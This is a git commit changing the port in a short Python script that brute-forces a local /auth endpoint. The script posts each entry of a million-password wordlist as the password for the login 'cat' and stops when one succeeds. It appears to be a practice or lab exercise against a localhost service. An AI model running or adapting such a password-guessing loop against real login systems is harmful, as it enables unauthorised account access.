04a0b134acfd0dc9209e97a2348eac7c2d7fcd44
kds <koutsenko.work@gmail.com>
2020-06-13 23:04:14 +0300

    Switch to nginx proxied port

--- popupar_passwords.py
+++ popupar_passwords.py
@@ -9,7 +9,7 @@ with open('10-million-password-list-top-1000000.txt') as f:
 passwords = content.split('\n')
 for password in passwords:
     response = requests.post(
-            'http://127.0.0.1:5000/auth', json={'login': 'cat', 'password': password})
+            'http://127.0.0.1:4000/auth', json={'login': 'cat', 'password': password})
     if response.status_code == 200:
         print('SUCCESS', password)
         break
